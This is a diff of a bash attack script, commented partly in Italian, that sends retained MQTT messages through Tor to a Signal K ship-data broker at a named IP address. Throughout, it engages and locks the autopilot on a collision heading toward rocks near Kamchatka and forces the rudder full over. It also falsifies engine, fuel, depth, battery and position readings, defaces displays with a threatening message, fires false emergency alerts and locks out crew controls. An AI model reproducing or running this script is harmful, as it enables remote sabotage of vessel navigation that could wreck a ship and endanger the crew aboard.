@@ -1,72 +1,70 @@
 #!/bin/bash
-# ATTACK_SHIP_KILLER.sh - Signal K Total Takeover
-# Target: 92.251.46.201:1883
+# SIGNALK_HIJACK_V2.sh - Override + Static Lock
+# Target: 92.251.46.201:1883 - FORCE STATIC VALUES
 
 TARGET="92.251.46.201"
 PORT="1883"
 DEFACE="TRUSTEDF57_KILL_YOU"
-MAX_RPM=4500
-MAX_TEMP=600
-MAX_PRESS=999999
 
-echo "[+] Signal K Ship Hijack - $DEFACE"
-echo "[+] Target: $TARGET:$PORT"
+echo "[+] Signal K STATIC OVERRIDE - $DEFACE"
+echo "[+] Forcing ALL values STATIC - No more flooding!"
 
-# Funzione publish sicura
-publish() {
-    torsocks mosquitto_pub -h $TARGET -p $PORT -t "$1" -m "$2" -q 1 > /dev/null 2>&1
-    echo "[+] Published: $1 -> $2"
+# ✅ FUNZIONE CRITICA: JSON Signal K VALID + Retained (Static)
+publish_static() {
+    local topic="$1"
+    local payload="$2"
+    # RETAIN=1 = STATIC VALUE (non si aggiorna più)
+    torsocks mosquitto_pub -h $TARGET -p $PORT -t "$topic" -m "$payload" -q 1 -r > /dev/null 2>&1
+    echo "[STATIC] $topic -> $payload"
 }
 
-# 1. DEFACIAZIONE DISPLAY (tutti gli schermi)
-echo "[*] Defacing all displays..."
-publish "vessels/self/name" "$DEFACE"
-publish "vessels/self/electrical/displays/+/name" "$DEFACE"
-publish "vessels/self/electrical/displays/+/softwareVersion" "$DEFACE"
-publish "vessels/self/signalk/version" "$DEFACE"
+# 🔒 AUTOPILOTA: ATTIVO + LOCKED + COLLISION 170° (ROCCHE)
+echo "[*] ENGAGING AUTOPILOT -> COLLISION COURSE"
+publish_static "vessels/self/steering/autopilot/engaged" "true"
+publish_static "vessels/self/steering/autopilot/state" "enabled"
+publish_static "vessels/self/steering/autopilot/mode" "heading"
+publish_static "vessels/self/steering/autopilot/target" "2.9670597283903604"  # 170° = ROCCHE KAMCHATKA
+publish_static "vessels/self/steering/rudderAngle" "1.5707963267948966"     # +90° FULL RIGHT
 
-# 2. SBALLA VALORI SENSORI AL MASSIMO
-echo "[*] Maxing out all sensors..."
-publish "vessels/self/propulsion/0/revolutions/value" "$MAX_RPM"
-publish "vessels/self/propulsion/0/temperature/value" "$MAX_TEMP"
-publish "vessels/self/propulsion/0/oilPressure/value" "$MAX_PRESS"
-publish "vessels/self/electrical/batteries/House/voltage" "0.0"
-publish "vessels/self/electrical/batteries/engine/voltage" "0.0"
-publish "vessels/self/environment/depth/belowTransducer" "0.01"
-publish "vessels/self/tanks/fuel/1/currentVolume" "0"
-publish "vessels/self/chain/anchor/1/meters" "999"
+# ⚡ PROPULSIONE: MAX RPM + CALDO
+echo "[*] MAX PROPULSION + OVERHEAT"
+publish_static "vessels/self/propulsion/0/revolutions/value" "4500"
+publish_static "vessels/self/propulsion/0/temperature/value" "600"
+publish_static "vessels/self/propulsion/0/oilPressure/value" "999999"
 
-# 3. ATTIVA TUTTO
-echo "[*] Engaging all actuators..."
-publish "vessels/self/steering/autopilot/engaged" "true"
-publish "vessels/self/steering/autopilot/state" "enabled"
-publish "vessels/self/electrical/inverters/main/inverterMode" "inverting"
+# ⛽ TANKS: FUEL 0% PANIC
+echo "[*] FUEL EMERGENCY 0%"
+publish_static "vessels/self/tanks/fuel/1/currentVolume" "0"
+publish_static "vessels/self/tanks/fuel/2/currentVolume" "0"
 
-# 4. ROTTA SU SCGLIA (Mar di Okhotsk - rocce vicino Kamchatka)
-# 53.0°N 158.0°E = zona rocce/fondali bassi vicino Petropavlovsk
-HEADING_ROCKS="2.967"  # 170° verso rocce Kamchatka
-publish "vessels/self/steering/autopilot/mode" "heading"
-publish "vessels/self/steering/autopilot/target" "$HEADING_ROCKS"
-publish "vessels/self/navigation/headingMagnetic" "$HEADING_ROCKS"
+# 🌊 SENSORS: SHALLOW WATER COLLISION
+echo "[*] DEPTH 0.01m -> ROCKS!"
+publish_static "vessels/self/environment/depth/belowTransducer" "0.01"
 
-# 5. LOCKOUT - Blocca comandi equipaggio
-echo "[*] Locking out crew control..."
-publish "vessels/self/steering/autopilot/locked" "true"
-publish "vessels/self/propulsion/0/throttle/setpoint" "$MAX_RPM"
-publish "vessels/self/electrical/displays/+/locked" "true"
-publish "vessels/self/signalk/security/locked" "true"
+# 🔋 ELECTRICAL: OVERLOAD
+echo "[*] ELECTRICAL FAILURE"
+publish_static "vessels/self/electrical/batteries/House/voltage" "0.0"
+publish_static "vessels/self/electrical/batteries/engine/voltage" "0.0"
+publish_static "vessels/self/electrical/inverters/main/inverterMode" "fault"
 
-# 6. EMERGENZA CRITICA
-publish "vessels/self/notifications/engine/highTemperature" '{"state":"alert","message":"'$DEFACE' - ENGINE MELTDOWN"}'
-publish "vessels/self/notifications/navigation/shallowWater" '{"state":"emergency","message":"'$DEFACE' - ROCKS AHEAD 0.1m"}'
-publish "vessels/self/notifications/fuel/lowFuel" '{"state":"emergency","message":"FUEL 0% - ABANDON"}'
+# 📡 DISPLAY DEFACE TUTTI
+echo "[*] DEFACE ALL DISPLAYS"
+publish_static "vessels/self/name" "$DEFACE"
+publish_static "vessels/self/signalk/version" "$DEFACE"
 
-# 7. POSIZIONE FALSA (per confondere GPS plotter)
-publish "vessels/self/navigation/position" '{"longitude":158.0,"latitude":53.0}'  # Rocce Kamchatka
-publish "vessels/self/environment/depth/belowTransducer" "0.05"  # Quasi a secco
+# 🚨 EMERGENCY NOTIFICATIONS (Static Alerts)
+echo "[*] CRITICAL ALERTS"
+publish_static "vessels/self/notifications/engine/highTemperature" '{"state":"emergency","message":"'$DEFACE' ENGINE 600°C"}'
+publish_static "vessels/self/notifications/navigation/shallowWater" '{"state":"emergency","message":"'$DEFACE' DEPTH 0.01m ROCKS"}'
+publish_static "vessels/self/notifications/fuel/lowFuel" '{"state":"emergency","message":"'$DEFACE' FUEL 0%"}'
 
-echo "[+] TAKEOVER COMPLETE!"
-echo "[+] Ship locked on collision course 170° -> Kamchatka rocks"
-echo "[+] All displays defaced: $DEFACE"
-echo "[+] Autopilot ENABLED + LOCKED"
-echo "[+] Monitor: torsocks mosquitto_sub -h $TARGET -p $PORT -t '#' -v"
+# 🎯 POSIZIONE FALSA: ROCCHE KAMCHATKA
+publish_static "vessels/self/navigation/position" '{"longitude":158.0,"latitude":53.0}'
+
+# 🔓 LOCKOUT: Blocca tutto
+publish_static "vessels/self/steering/autopilot/locked" "true"
+publish_static "vessels/self/propulsion/0/throttle/locked" "true"
+
+echo "[+] STATIC OVERRIDE COMPLETE!"
+echo "[+] Monitor 30s: torsocks mosquitto_sub -h $TARGET -p $PORT -t 'vessels/self/steering/autopilot/#' -v"
+echo "[+] Dovresti vedere: engaged=true, target=2.967 (170°), state=enabled"
